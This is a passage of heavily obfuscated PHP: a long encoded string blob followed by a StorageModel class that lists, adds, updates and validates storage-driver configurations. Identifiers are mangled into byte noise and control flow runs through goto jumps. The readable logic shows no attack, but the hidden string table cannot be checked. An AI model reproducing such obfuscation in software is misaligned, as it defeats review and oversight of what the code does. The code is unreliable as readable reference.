65\262\141\10\173\153\65\10\33\160\176\127\70\53\234\175\144\316\327\364\300\57\162\7\353\126\76\337\37\2"."\xac\x8d\x9a\x8f\x84\x44\x6\x4b\x58\x37\xc1\xba\x98\xd2\xc4\x5a\x42\x59\x6f\x73\x3d\xa9\x7e\x96\xdd\xd5\x7c\x8e\x9d\xbb\x1c\x9d\x5c\xd3\x9f\x4c\x48\x44\xeb\xa9\x2e\x2c\x77\x94\x15\x4a\xd4"."\x3f\x7f\x75\x61\x5b\xb0\xc1\x3e\xa1\xb0\x66\xca\x88\xc9\x75\x68\xa7\xdd\x50\x9a\xe1\x56\x39\x74\xe7\x8a\x95\xd1\x29\x64\x6b\x6c\x32\x9c\x42\x2c\xe2\x34\xc7\xf6\x57\x16\xa7\xcb\x49\x79\x50"."\x4b\x81\xe5\xc\x70\xa1\xa4\x23\x42\x90\xd9\xc6\x38\x15\xf7\x2\x9b\x52\x8c\x3e\x2d\x43\x8e\x11\x8\x13\xad\x28\x1b\x23\xd2\x2d\x21\x11\x9d\x4e\x5f\x74\x77\xba\xa\xee\x95\xd1\xee\xb7\xa5"."\7\262\51\73\124\211\355\1\321\213\225\305\353\164\231\71\77\124\152\315\371\105\366\27\341\54\42\311\203\330\113\170\225\44\272\216\27\174\154\332\341\272\217\147\36\335\137".strrev('ÀŠ€±[–½[“ı˜²ù(kÀ©0¤²mQÚ[g{fd/l†ºR–=H)È0!')."\301\265\213\356\320\373\201\40\15\223\241\43\145\73\34\137\273\32\335\137\12\237\324\171\233\32\41\244\222\57\113\133\126\215\132\77\211\116\156\354\331\54\375\140\336\112\105"."\x31\x9f\x66\x40\x9d\xf0\xb0\xfa\x4c\x2\x37\x50\xd0\xed\x4c\xc6\xb6\xca\xec\xc2\x1e\x66\xae\x2b\x62\x30\x79\xa5\x8a\xca\xaa\xb1\x13\xab\xe8\x5\x8b\xd1\xf4\xe0\x29\x9b\x36\xaa\x59\x90\xba".base64_decode('Kj7DGaN8gDszp32DA27yzyyAORrZDKcMxJSPt9bkCp90FOuPgldqtNmKZxI8iQ0=')."\61\57\337\171\70\151\124\41\67\151\324\24\131\132\5\133\64\66\40\135\64\220\141\371\145\76\105\302\211\156\336\223\60\264\264\43\24\336\15\32\252\161\121\12\55\253\302"."\316\146\44\236\115\165\127\13\211\222\241\151\122\122\116\15\234\201\201\243\364\252\121\372\44\370\241\352\121\216\61\61\35\104\160\2\367\320\10\327\21\356\257\13\273\250\40"."\51\170\153\331\1\135\350\73\340\42\345\317\122\313\142\264\261\204\303\255\211\54\163\245\236\106\141\322\332\126\157\133\243\247\105\70\110\26\0\241\272\372\226\220\253\265\65".base64_decode('b4L4DSc8fnHMo6+FRCiFTVaTXVIEWo1WF0BogaRnItRnZYGT8FSUgatIk1VSpBA=').base64_decode('FpFigGTsKISTC6dMdqpTGOK5c5CMxo1iHc4zocLkhGe0qdFwpMUjIwRt4K5AJGk=').base64_decode('sixhnFYXwgO0WKEUB2szs0KZYi3cQs8tJjtlMRHOMr9GxV2mNPWyDeS8O+OuiMU=')."\7\172\235\234\232\221\133\4\126\356\210\210\111\170\44\221\331\156\156\176\47\122\366\235\134\77\64\37\25\260\335\365\74\104\341\140\17\216\244\345\110\67\244\56\276\24\220"."\157\222\204\126\250\222\340\4\223\347\156\103\70\24\313\102\263\171\264\1\234\341\17\22\314\237\217\53\202\253\377\202\5\271\60\142\113\143\115\162\245\125\53\10\122\216\25"."\6\265\152\16\3\153\232\371\63\230\152\305\114\34\102\363\340\137\136\306\333\322\310\43\130\5\61\45\266\123\263\65\24\353\150\57\164\224\54\130\340\124\351\141\164\107\201"."\271\254\203\345\306\361\16\207\71\77\350\11\101\75\313\110\0\326\234\130\226\234\112\46\337\10\147\11\67\322\147\207\316\22\74\211\256\256\236\322\316\316\33\72\151\32\25"."\x8\xd5\xf2\x9\x74\xf8\x7\xe3\xf6\xe0\x4c\x16\xac\x6b\xe1\x22\x2f\x5a\xd6\xcd\xf6\xc2\x40\xdc\xb5\xd8\xb\x8b\xef\x97\xb1\x59\x81\x19\x90\x3\x6d\xa1\xb8\xcc\x5e\x34\x6b\x7a\x99\xa7\x7d"."\221\145\341\260\53\235\26\243\364\301\11\264\131\236\120\303\116\306\36\360\6\272\43\302\315\333\151\26\304\234\54\160\170\304\154\111\200\146\315\10\334\13\70\51\20\331\346".strrev('!“)¼ á'."\n".'pÈÀè\''."\n".'z—Ñ RÎ2½Éæ· k/Ãc'."\r".'¦£$zÉd. áY')."\xc7\x92\x32\x4a\xa2\xba\x0\x35\x57\x8f\x2b\xa\x28\x8f\x78\x52\xbe\x8f\x80\x82\x5\x12\x65\xa7\x49\x99\x61\x2c\x63\x68\x60\xd5\x64\x36\xd2\xe4\x55\x92\x36\x3f\xb1\x50\x75\xb5\x90\x3\xa"."\42\217\235\71\7\377\236\165\46\33\110\370\14\116\102\311\140\63\74\304\246\320\221\125\214\357\163\221\107\122\132\375\276\240\257\216\276\63\221\157\103\154\14\25\176\165\174".base64_decode('M4ArSdREepp7tjkHEyecBEKGP5NNpZhNAJQv2ZqHD3wC8azBV0voKDoIb0zpBCw=')."\170\366\202\176\305\224\250\303\24\311\223\15\237\311\303\112\350\244\61\155\152\340\352\23\32\365\147\126\121\126\126\146\57\53\7\377\263\263\110\42\240\125\261\213\177\74\113".strrev('¢ö°e>b4Ø%ÓÍ^Õ©eMRxDBŠ}‘=”å˜'."\n".'sE‚X­ \'úYY')."\x4b\x5e\x94\x53\x4c\x12\x34\xbf\x49\x12\x3a\xeb\x22\x31\xc5\x8a\x4\x76\x88\x48\x86\x84\x2e\xb9\x70\xa6\xd3\x30\x10\x65\xc0\xf0\x20\xa4\x90\xf6\xb2\x5b\x12\x20\x1b\x1f\xf8\x49\xf8\xde\x49".base64_decode('NWuUOxVtFz/moMjFQO741E4T7KIjcVIIrwHcdMLUNFAGrLwR1isIELY80P03dgM=')."\0\305\22\354\126\44\214\266\260\254\330\375\74\276\342\100\120\222\207\300\342\132\137\210\257\236\60\72\225\305\20\206\240\302\103\251\52\112\364\265\111\4\115\224\55\122\52"."\242\47\332\344\200\34\335\3\354\126\23\246\13\113\41\241\156\21\71\223\140\106\321\10\4\114\32\27\363\263\17\170\23\24\232\51\11\340\335\371\152\216\166\7\47\36\344".strrev('„Èşc¨€6'."\0".'Sq'."\n".'s'."\r".'ø‹ºCåÂcG•<åoÆŒö„aŒäFªj-…ğ½À').base64_decode('CqxJljKuqPCKm84dkdUxL4iidzJ8YCyYFejE1TI/IaZ19ApKiyOd0brAYOliXwE=')."\xbc\x35\x3f\x98\x65\xcf\xcd\x99\x27\x13\xeb\x90\x98\x4f\x4\x42\x9b\x25\xfa\xa0\x18\xa1\x3b\x7e\xab\x49\xe6\x4f\x1d\xa\x59\xf9\x15\x21\x1\x68\xb6\x2a\x12\x12\xea\xd8\xa3\x16\x22\x10\x2a"."\x41\xa2\x4d\x0\xba\x83\x6a\xae\x3\x4a\x16\x66\x8\x6b\xd9\xaf\xd0\xa\xd5\x8a\xd\xf2\xf8\x9c\x70\x23\x8d\x64\xe3\x9c\x0\xee\x58\x88\x7b\xa7\xaa\x46\xcd\xd\x20\x36\xf8\xd1\x9f\x19\x8e".strrev('d(‚æŒ°4UÑ`ûNf,Zº­“%Zrf@+tA»ïwĞ¡*¸ÈƒOÎˆGXa')."\133\154\342\376\62\104\137\110\334\76\200\223\256\211\75\267\226\207\350\314\204\225\103\101\150\367\31\126\120\305\370\223\20\3\372\22\225\220\242\264\275\75\131\205\112\165\2"."\63\223\14\316\312\10\343\11\306\63\232\141\210\227\220\135\121\201\3\173\305\65\75\210\213\330\247\360\357\230\216\243\4\307\245\54\53\130\113\350\327\145\272\276\40\33\40"."\344\160\133\320\132\54\121\253\235\20\132\35\14\312\377\251\307\327\24\173\22\5\16\147\100\60\323\310\363\5\122\210\25\41\213\124\106\211\150\31\244\276\12\67\52\123\206"."\137\351\22\243\136\215\251\355\360\370\103\311\123\5\274\62\57\220\70\244\2\240\120\146\305\13\370\202\303\130\20\23\74\364\12\302\206\275\134\142\122\112\10\327\214\43\245".base64_decode('QgLKn09gsWwkCZaZSF8OZMNsz94iRlBjT0lcpan1JqwA3WWGPdDFNFAtdA7JeyY=')."\26\101\337\314\51\202\323\340\312\312\315\74\305\24\35\50\130\20\125\373\117\311\363\51\224\44\140\64\302\374\52\20\354\160\44\221\204\1\205\232\202\331\313\53\354\225\345".strrev('Â–ëËh]Ñ<lÎ+¢4¯Ë÷ºìğš<ñòE×bAòœ)@·Êà—Å’€Z,8')."\x6c\xbe\xd0\xa5\x60\x91\xad\xf0\x33\x69\x6c\xa\x6\x33\xb4\xe5\x4b\xc7\x18\x82\xc9\xf5\x26\x4b\x39\x4b\x6\x30\x33\xcc\xe9\xc4\xb\x70\xd2\xf4\x8c\x2e\xa0\x3\x93\xb9\x85\xa5\x12\xe2\xe9".base64_decode('WfRujErxfnCjQwDSsK9hATH8bB1fl6bWkowvcXBQY8Dc83kHsxYlF2HI+2ZFxfA=').base64_decode('Ioxpk6R5gF1oACPZDRcJZrKnixGayohTN0WwiYupNAOxXH0KudPClPnWplYnA9U=').base64_decode('UjSxq6lEseMvZhHjL3KppA/gXesjE6yuiln90Gd5+5JqRPL6Gj11Lm+9JzBN6lI=').base64_decode('DOFxaeTN2zzd0f4WHhxK+WHm0BoG7WEgeNqjTBzXueAtGAMJr3WYq8U0qmRyagQ=')."\x62\x7c\xd2\xcc\x10\x50\x19\xb8\x6b\x97\x27\x77\x82\x6f\x62\x9\x99\xd3\x19\x25\x37\xff\x80\x82\xde\xd6\xe5\x2d\x16\xa\x64\xf3\xb4\x86\xe4\xcf\xff\x5\x30\x45\xcc\xb9\xc1\x62\xad\xa4\xf6".base64_decode('13g11avqKmcOtMSAWDvfl8wwn+pR0QW7MAIc2fgruV5JiBsG0ZOvRW3GwyS6r0k=')."\xd3\x1d\x77\xf2\x50\x14\xf7\xe1\x8f\xa2\xc2\xeb\xa\xe9\x8c\xac\xea\x8a\x0\xc0\x6e\xfe\x4b\x88\x41\xbc\x9c\x48\x98\x9e\x3f\x4a\xc4\x84\x68\xd6\xbc\xca\xe6\xfd\x54\x8\x7f\x80\xc2\x4\xf"."\71\371\62\370\341\313\265\377\343\246\252\121\356\73\102\215\322\303\175\166\11\0\73\211\256\23\237\312\242\337\314\171\101\342\67\337\242\260\361\375\271\20\272\102\117\37\274".strrev('I«~'."\r".'©;0É„aˆwMÇèLõO©u(ÎD‡‹H—^€\'ùô×Â¸v“uïA')."\x40\x69\x83\xa7\x25\x54\x9c\xa6\xbb\x2d\x80\x1f\x10\x3c\x9b\xe\x49\x2d\xaf\x6a\x58\x6d\x1\x4d\xef\xd3\xe6\x7c\x3\x5a\x67\xed\xbf\x1e\x50\x4e\xe2\x5b\x11\x2c\x83\x54\x2d\x95\xe1\xe7\x5a"."\x98\x47\x6e\x69\x32\xbd\x84\xc4\x3f\x81\x7c\x53\xb8\x93\x69\xc3\xa4\x9\x36\x89\xb6\xbc\x2\x8a\x31\x0\x9\x2f\x5c\xfa\x87\x96\x26\x5a\x72\x20\x7\x60\xda\x91\xf0\xd2\x76\x31\x6b\x34\xe8"."\217\74\25\323\104\64\40\376\11\15\263\361\133\112\130\345\264\1\361\135\61\162\237\127\300\305\377\117\12\342\304\200\140\243\147\256\44\267\101\272\165\365\342\222\24\174\71"."\42\256\365\231\37\124\202\20\353\133\21\246\127\42\4\332\107\67\127\305\167\55\350\353\2\100\110\65\75\1\42\124\70\12\377\164\220\137\272\246\130\253\306\134\204\174\275".base64_decode('mJFKXVxNRDPMWIIDmhWuPaJS0F5Apg/2scd/OJUxP/PMrzyfoOgVmvr95LOAJbM=')."\x83\x7d\xfe\x6e\x1\x5f\xef\xcc\x9e\xdd\xd9\x9\x21\xb3\x19\x43\xb6\x7b\xe2\xcb\x1\x41\x2d\x28\x77\xd9\xb0\xa4\x5\x39\x14\x8f\xd5\xe\x88\x61\xd1\x4c\x12\x75\x1a\x24\xd2\x7d\x9c\x28\x1b"."\xf4\x29\x42\x6\xfa\x8c\x4f\xd4\x86\xde\x98\xc1\x6c\xcb\xea\xf0\x5e\x98\x6e\x8c\x17\x8a\xa5\xbb\x12\x5a\x58\x4e\xf8\xb1\xd9\x91\xc9\x96\x3f\x3\xb4\x24\x66\x4a\x68\xca\x86\x41\x4e\x39\x9d"."\346\247\26\226\103\10\14\44\7\22\331\224\7\337\21\63\101\63\202\26\46\32\252\342\243\15\176\75\206\144\7\137\153\305\207\63\244\333\142\225\364\300\214\155\112\66\10"."\257\271\72\163\17\330\240\131\24\141\16\242\325\40\71\353\164\210\152\22\311\40\115\226\370\0\233\346\44\44\10\40\253\332\120\0\115\172\121\254\376\25\50\243\103\363\223".strrev('éäl‰Ãd=0ü8üg¸l‚§°ÏĞë¯­ÙË¼UõóŒ:c½OÑ`˜')."\33\277\346\364\153\257\52\360\107\32\315\57\73\302\66\63\63\273\34\141\337\52\347\63\124\131\12\370\255\210\13\152\271\273\177\374\130\61\225\115\362\203\132\20\61\353\75"."\x39\x1d\x16\x7a\x98\xcd\x24\x6c\xe8\x50\xd5\x46\x1d\xc1\x58\xd0\xc1\x7b\x25\x8e\x4c\x1e\x1c\xfe\x76\x1d\xd8\xda\x12\x29\x33\x51\x33\xd7\xa9\x9a\x1c\xce\xd0\x73\x26\x6b\x36\xd5\x44\x75\xa1"."\214\302\315\375\261\237\254\234\327\73\146\47\243\25\225\143\47\212\233\6\174\174\370\371\15\365\134\213\177\310\312\317\107\134\32\62\321\223\104\235\163\211\363\26\45\232\15"."\141\163\337\350\262\160\340\377\31\345\163\211\33\147\25\314\122\163\137\62\314\301\0\42\102\301\230\103\130\277\54\247\365\32\74\104\327\371\364\301\53\26\177\231\313\374\55"."\274\206\347\351\7\377\254\60\23\360\123\111\132\2\352\256\111\270\377\152\144\144\263\22\226\117\327\100\230\240\212\215\212\236\31\125\254\155\107\210\41\273\24\74\131\120\106"."\xc4\x1a\xd\xcd\xba\xc5\x2\x8b\xc3\x75\x9\xed\xf0\xf9\x52\x9\xb2\xca\xc2\xeb\x9b\x7c\x4e\x9\x2c\xe5\x7f\x30\x80\x54\xdf\xc0\xaa\x9\xb7\xd5\xc8\xd3\x73\xe7\xd9\x94\x6f\xe4\x79\xa\x4b".strrev(';‹1xK9\\¦_ÚM§G^1Aê–¯¹ª'."\n".'0'."\r".'†)Ël)°ÙvVé‹cv•ş¿8')."\xb1\x10\x24\x2c\x58\x9a\xde\x13\xdb\x8f\xa6\x4c\x99\x93\xf8\x16\x98\x11\xe7\xaa\x0\x9e\xa1\xa6\xd9\x2a\xb8\xbc\x13\x2f\xce\xa0\x8a\xc4\x69\x90\x5b\x35\xda\x7c\x21\xed\x25\xd3\xb5\x29\x18"."\154\305\167\243\134\215\354\276\224\54\230\322\100\324\11\17\337\151\142\330\174\31\331\107\135\201\1\231\310\244\206\201\170\275\345\155\104\304\162\254\17\46\322\376\243\171\316"."\131\230\160\361\316\244\54\260\267\155\114\312\203\156\175\166\12\110\117\242\247\77\20\145\24\116\326\112\302\353\220\305\62\376\232\315\372\174\150\132\270\167\154\171\15\131\330"."\7\65\277\163\154\272\237\10\335\55\130\246\65\275\365\250\133\36\203\303\216\326\160\230\12\336\377\327\357\54\375\277\172\136\151\154\31\335\261\66\75\255\330\110\344\131\322"."\x5a\x78\x4\xc5\x74\x75\xbc\x5b\x6a\xe9\x87\x79\x45\x24\x4f\x74\xf3\xc7\x44\x85\x38\x33\xcb\xa4\x2e\x37\xa8\x27\xe\x99\x9e\xb0\xc8\x89\x84\xf5\xb8\x31\x47\x3\xc8\x79\x85\xe\x10\x5f\x37"."\x7b\x3a\x2d\x5f\x24\xf7\xf1\x57\x13\x9d\x51\x49\x52\x78\x7a\x54\x8d\x74\xe7\x39\xe\x84\xd8\xf6\x9a\x1d\x20\xa\xeb\x7f\x4e\x36\xce\x8a\x80\x98\x40\x7d\x8f\x38\x69\x28\x2\x15\x28\x28\x24"."\122\16\50\336\240\363\245\251\252\125\114\230\156\347\331\224\123\240\73\271\204\141\210\114\302\4\312\141\55\101\23\16\115\100\21\75\374\351\144\366\160\253\251\104\263\345\35".strrev(':éåT?Ã~ç·-J_Y–£aœŞj½hb·›4·8t÷7X}ÊOú‰œ.')."\xb8\x40\x7\x8b\x79\xca\x60\x3a\xb\xf0\x3c\xfb\xa1\xf4\xfc\xf3\x8d\xbd\x7f\xc6\xf5\x59\x18\x12\xfb\x4b\xe7\x6d\x6b\x46\x43\xb2\x96\x19\xca\xb6\x37\x4\x63\x41\xe1\x95\xce\x9c\x57\xf8\x2c"."\x7\x0\x40\xf1\xe1\x27\x62\xaa\x86\x1c\x9c\x92\x6e\x7\xda\x9a\x8b\xd0\xfd\x7\x42\xa9\x40\x6e\x17\x1e\x2f\x37\x92\x69\xbc\xed\x35\x24\x2c\x97\xf4\x72\x91\x60\xb7\x4b\x40\xa6\xcd\x29\x5d"."\xf4\x4f\x6d\x2e\x9\x2d\xb1\xcd\x33\x65\x4a\xbe\x6c\x11\x2d\xa3\xb\xd9\x18\x3c\x5f\x5e\xf8\xd0\xa1\x61\xc2\x26\xf7\x3a\x6b\xf5\x36\x8b\x94\x5c\xac\xb7\x9a\xd4\x57\x72\xfc\x28\x82\x84\xd3"."\x39\x20\xc9\x46\xcd\xce\xb2\x51\x22\x2\x53\x7f\x56\xf4\x71\x7b\x7e\xbe\x64\x3e\xde\x63\x8e\x34\x73\x38\x55\x56\xf5\xa\xc9\xa8\x14\x75\x8e\x2\x7e\xe1\x25\x2b\xf\xbf\x75\x8e\x92\xf1\xae"."\xb8\xab\x57\x36\xe8\x21\x99\xb5\x94\xf9\xd\x54\xe1\x30\x30\x82\x68\xc7\x9d\x7b\xde\xc3\x8f\xa1\x84\x75\x9e\x16\x83\x6a\x6\x67\xc1\x16\xb8\xc0\xe7\x39\xb7\x93\x7b\xf9\x11\xf\x17\x74\xa3"."\121\366\336\256\51\153\224\212\372\14\12\40\374\151\136\50\326\10\367\66\271\171\260\322\147\175\116\321\41\336\365\64\145\314\205\362\173\235\102\171\276\333\317\273\11\141\371".strrev('E¨&ìAäÆÆË*–ù¤ÿ2a]ÁŸ·;É *PFLÌÄa”ox¸¹Œ¦º').base64_decode('TYL7DXTFtiTp4lPC5jM+UWUXSEBJeIXqxPO//RYI5P8Ip0ozioUbvTyBLlZiLSY=')."\146\307\72\106\162\372\305\104\123\163\254\103\213\44\174\116\276\30\230\104\133\232\70\315\145\116\302\371\25\113\353\305\2\326\236\341\22\172\237\152\104\342\202\332\221\233\230".base64_decode('C8/kIJV8KH97ra2iOLUqY7ySnPYIRgRBLU8Z3KK8xXASLMnFRVPZ/aAAlsVJsGw=').base64_decode('TjItLOxdCOUMOavvp3u5yCMKfTRPhy1qL866P3zmzZz7OUJx1txoByB/K7jibjk=').base64_decode('qM3XiryZ99uKPI94Ez9heXgtTcnDXfmpfi4f52l5bAxwnXCNFt3S5EkWDRbymzQ=').base64_decode('+PNOfd1sa2CBi4ihdkdAOePPQgsWuqNMLD2b6k5pbJmIcuswaHzKHlJmn8upzUw=')."\x9a\xa9\xac\x60\x37\x9a\xd7\x60\xd8\x6\x55\xe9\x5c\xa5\x35\x21\xd3\x3d\x70\xc1\xd2\x1a\x6b\x2d\x9a\xa1\x46\x4\x7b\x27\x6e\x75\xca\xba\xa9\x72\x31\x3e\x21\xec\xb5\x59\xb6\xb9\xb8\x62\x6f"."\72\362\316\263\21\204\100\70\350\340\333\311\46\273\163\274\376\223\175\164\174\232\126\7\17\137\331\21\12\124\257\154\170\275\304\311\1\55\143\330\140\132\120\113\243\337\132"."\315\60\370\41\61\126\227\221\220\7\27\75\233\140\353\0\102\374\274\4\142\21\155\341\43\162\104\154\3\5\311\271\36\324\103\3\12\116\105\314\306\24\201\107\3\54\42"."\xae\x69\xe4\x7c\xaf\x21\x6b\x39\x81\xe4\x0\xa0\x44\x86\xb5\x7e\xea\x3\xe\x5e\x86\xe5\xed\xe1\xef\x2f\xcb\x56\x41\x8e\xcb\x20\x84\xde\x44\xcb\xd\x74\xe5\x58\x77\xe2\x14\x27\xf1\x9e\x6b"."\107\165\220\307\66\34\363\322\135\246\342\370\371\0\146\261\370\153\65\220\155\110\136\5\366\252\211\166\220\240\177\131\367\54\117\40\30\310\111\152\165\5\2\63\175\376\172"."\xec\x84\x33\x27\x19\x95\x12\x8c\x64\x72\x92\x5a\x9b\x7c\x2d\xfb\x4b\x73\x37\xbb\x3c\xde\x9c\x34\x68\x34\xd3\x12\xe2\x4e\x82\x70\x92\xa7\x15\xb5\xd2\xe5\xf5\xfa\x66\xee\xaf\x15\x9e\xba\x69"."\274\45\350\320\224\357\156\247\343\32\335\264\246\273\377\1\71\101\165\151\341\356\234\222\344\336\242\170\31\363\26\201\70\256\72\165\244\306\2\146\127\365\26\373\65\112\260"."\244\42\150\360\322\102\352\366\323\307\255\240\123\122\66\271\231\260\214\72\44\332\311\361\143\141\207\351\370\130\200\243\311\202\130\214\100\204\342\352\212\0\45\171\61\46\156".strrev(''."\0".''."\0".'¢s_Ú£ßşI0á9X,pFĞ¹ºÇšØXZy¸}ô©ÒØT£İnæ•').base64_decode('')."", 10, -8))); goto D»ÑÕˆÎó©; e–’È—ñàò: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\163\x74\x6f\162\x61\x67\x65\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\151\172\145\x4d\x61\x78", "\x73\171\x73\164\145\x6d", "\144\145\x66\141\165\154\164", "\x64\162\151\x76\x65\x72", "\143\157\x6e\x66\x69\x67"); public function listData($c×·Êù…à„ = false, $DåÑì»î• = "\x6d\x6f\x64\151\x66\171\124\x69\155\x65", $AÕ‰öã×ç = false) { $bÎŠÕšöÚç =& $_SERVER[›é¼±]; $D§—ßÉ¤¨ˆ = parent::listData($c×·Êù…à„, $DåÑì»î•, $AÕ‰öã×ç); if ($c×·Êù…à„) { return $D§—ßÉ¤¨ˆ; } $c„¤š‰¶¿ğ = $this->ioSizeUseGet(array_to_keyvalue($D§—ßÉ¤¨ˆ, $bÎŠÕšöÚç[33], $bÎŠÕšöÚç[395])); foreach ($D§—ßÉ¤¨ˆ as $dùÀÊµØãå => $AÜš¼® ™) { unset($D§—ßÉ¤¨ˆ[$dùÀÊµØãå][$bÎŠÕšöÚç[6]]); $D§—ßÉ¤¨ˆ[$dùÀÊµØãå][$bÎŠÕšöÚç[1719]] = isset($c„¤š‰¶¿ğ[$AÜš¼® ™[$bÎŠÕšöÚç[395]]]) ? $c„¤š‰¶¿ğ[$AÜš¼® ™[$bÎŠÕšöÚç[395]]] : 0; } return $D§—ßÉ¤¨ˆ; } public function ioSizeUseGet($F“åÇÎù) { goto BÍÊ¤†„íô; BÂº„˜ÁĞ: $BªìÕ„¬â© = array($a¼‚ §“†ƒ[819] => array($a¼‚ §“†ƒ[7], $F“åÇÎù)); $a°ª®±˜ñœ = Model($a¼‚ §“†ƒ[782])->field($bÕ¸îØ¬á)->where($BªìÕ„¬â©)->group($a¼‚ §“†ƒ[819])->select(); $a°ª®±˜ñœ = array_to_keyvalue($a°ª®±˜ñœ, $a¼‚ §“†ƒ[395], $a¼‚ §“†ƒ[78]); goto D×›Š¬„; b¦×Šõ‘²Õ: $a°ª®±˜ñœ = Cache::get($D‘›ëëïÌ); if ($a°ª®±˜ñœ) { return $a°ª®±˜ñœ; } $bÕ¸îØ¬á = array($a¼‚ §“†ƒ[819] => $a¼‚ §“†ƒ[395], $a¼‚ §“†ƒ[2034] => $a¼‚ §“†ƒ[78]); goto BÂº„˜ÁĞ; BÍÊ¤†„íô: $a¼‚ §“†ƒ =& $_SERVER[›é¼±]; if (!$F“åÇÎù) { return array(); } $D‘›ëëïÌ = $a¼‚ §“†ƒ[2033] . implode($a¼‚ §“†ƒ[47], $F“åÇÎù); goto b¦×Šõ‘²Õ; D×›Š¬„: Cache::set($D‘›ëëïÌ, $a°ª®±˜ñœ, 600); return $a°ª®±˜ñœ; goto A±˜‘ ´ÁÛ; A±˜‘ ´ÁÛ: } public function getConfig($aĞù²à‘›‘) { $fŞ¸£¨ÕÇÊ = parent::listData($aĞù²à‘›‘); return json_decode($fŞ¸£¨ÕÇÊ[$_SERVER[›é¼±][6]], !0); } public function update($Dµ…‚áÚ£, $fÈ¾°ËÏàÜ) { goto cŞ›ÁâÕ½‡; Fñ¸¯‹‘®: $f­Œï»²ã = parent::update($Dµ…‚áÚ£, $fÈ¾°ËÏàÜ); if ($f­Œï»²ã && $fÈ¾°ËÏàÜ[$cˆ’ˆ¨®¢[34]]) { foreach ($BÁÄ¡®·ƒ× as $aÅò×ïšŒ´) { if ($aÅò×ïšŒ´[$cˆ’ˆ¨®¢[34]] && $aÅò×ïšŒ´[$cˆ’ˆ¨®¢[395]] != $Dµ…‚áÚ£) { parent::update($aÅò×ïšŒ´[$cˆ’ˆ¨®¢[395]], array($cˆ’ˆ¨®¢[34] => 0)); } } } return $f­Œï»²ã; goto Fìâ›¢ïğ•; cŞ›ÁâÕ½‡: $cˆ’ˆ¨®¢ =& $_SERVER[›é¼±]; $E”¿…ë­¿ = $fÈ¾°ËÏàÜ[$cˆ’ˆ¨®¢[28]]; $BÁÄ¡®·ƒ× = array_to_keyvalue(parent::listData(), $cˆ’ˆ¨®¢[28]); goto Fó´ÌÒ­½Ñ; Fó´ÌÒ­½Ñ: if (isset($BÁÄ¡®·ƒ×[$E”¿…ë­¿]) && $BÁÄ¡®·ƒ×[$E”¿…ë­¿][$cˆ’ˆ¨®¢[395]] != $Dµ…‚áÚ£) { return !1; } if (isset($fÈ¾°ËÏàÜ[$cˆ’ˆ¨®¢[2035]]) && $fÈ¾°ËÏàÜ[$cˆ’ˆ¨®¢[2035]] == $cˆ’ˆ¨®¢[87]) { $this->checkConfig($fÈ¾°ËÏàÜ); } unset($fÈ¾°ËÏàÜ[$cˆ’ˆ¨®¢[2035]]); goto Fñ¸¯‹‘®; Fìâ›¢ïğ•: } public function add($eá”ó¼äíÓ) { goto a“Ê‚Ì’„¼; FÔ·’°ä‡: $this->checkConfig($eá”ó¼äíÓ); $fæäñÙŞÕí = parent::insert($eá”ó¼äíÓ); if ($fæäñÙŞÕí && $eá”ó¼äíÓ[$dŒ¯Û·ñ„[34]]) { foreach ($E®®â…åáÓ as $aäİ˜ò£ÈŠ) { if ($aäİ˜ò£ÈŠ[$dŒ¯Û·ñ„[34]]) { parent::update($aäİ˜ò£ÈŠ[$dŒ¯Û·ñ„[395]], array($dŒ¯Û·ñ„[34] => 0)); } } } goto c‚Ùˆ×ÄÄ; a“Ê‚Ì’„¼: $dŒ¯Û·ñ„ =& $_SERVER[›é¼±]; $E®®â…åáÓ = array_to_keyvalue(parent::listData(), $dŒ¯Û·ñ„[28]); if (isset($E®®â…åáÓ[$eá”ó¼äíÓ[$dŒ¯Û·ñ„[28]]])) { return !1; } goto FÔ·’°ä‡; c‚Ùˆ×ÄÄ: return $fæäñÙŞÕí; goto EíŠîÓéï; EíŠîÓéï: } public function checkConfig(&$BÑÏÈ­ßŠ, $fÇøªŒâ² = false) { goto A— „ÛäÆ; bŸÎ…èÌ”: $BÑÏÈ­ßŠ[$bë›™ø÷[6]] = json_encode($F§½œ›”Äó); $BÑÏÈ­ßŠ[$bë›™ø÷[94]] = $C©ê««åŠÙ; return !0; goto DÕïÑ­í¹; dÃç£ÏÍµĞ: $bğîÛ•¿¢” = $DáÆãø§’Ê->getPath($a¥±ğ³ë . $bë›™ø÷[1171]); if (!$DáÆãø§’Ê->mkfile($bğîÛ•¿¢”)) { if ($fÇøªŒâ²) { return LNG($bë›™ø÷[2040]); } show_json(LNG($bë›™ø÷[2040]), !1); } $F§½œ›”Äó[$bë›™ø÷[1109]] = $a¥±ğ³ë; goto bŸÎ…èÌ”; bÂÈãùƒ²™: foreach ($F§½œ›”Äó as $Bˆø‡‹Œ„Ø => $eßÖÊà‘ÌÜ) { $F§½œ›”Äó[$Bˆø‡‹Œ„Ø] = trim($eßÖÊà‘ÌÜ); } $F§½œ›”Äó[$bë›™ø÷[2036]] = rand_string(6); $EÃ¸ê´àï… = $GLOBALS[$bë›™ø÷[6]][$bë›™ø÷[88]][$bë›™ø÷[828]]; goto CŠî•³†Á; BÖÍ¹ÏÖ•: $DáÆãø§’Ê = new $aÅ¬º²ò±ï($F§½œ›”Äó); if (in_array($fÁ‚À¤ÌÊ‘, $DáÆãø§’Ê->objectDriver)) { if (!$DáÆãø§’Ê->isBucketCors() && !$DáÆãø§’Ê->setBucketCors()) { $e´Ö«ŒİºÕ = LNG($bë›™ø÷[2040]); $e´Ö«ŒİºÕ .= $bë›™ø÷[2041] . LNG($bë›™ø÷[2042]); if ($fÇøªŒâ²) { return $e´Ö«ŒİºÕ; } show_json($e´Ö«ŒİºÕ, !1); } } $a¥±ğ³ë = rtrim($F§½œ›”Äó[$bë›™ø÷[1109]], $bë›™ø÷[8]) . $bë›™ø÷[8]; goto dÃç£ÏÍµĞ; A— „ÛäÆ: $bë›™ø÷ =& $_SERVER[›é¼±]; $fÁ‚À¤ÌÊ‘ = strtolower($BÑÏÈ­ßŠ[$bë›™ø÷[94]]); $F§½œ›”Äó = json_decode($BÑÏÈ­ßŠ[$bë›™ø÷[6]], !0); goto bÂÈãùƒ²™; CŠî•³†Á: $C©ê««åŠÙ = isset($EÃ¸ê´àï…[$fÁ‚À¤ÌÊ‘]) ? $EÃ¸ê´àï…[$fÁ‚À¤ÌÊ‘] : ucfirst($fÁ‚À¤ÌÊ‘); $aÅ¬º²ò±ï = $bë›™ø÷[72] . $C©ê««åŠÙ; if (!$C©ê««åŠÙ || 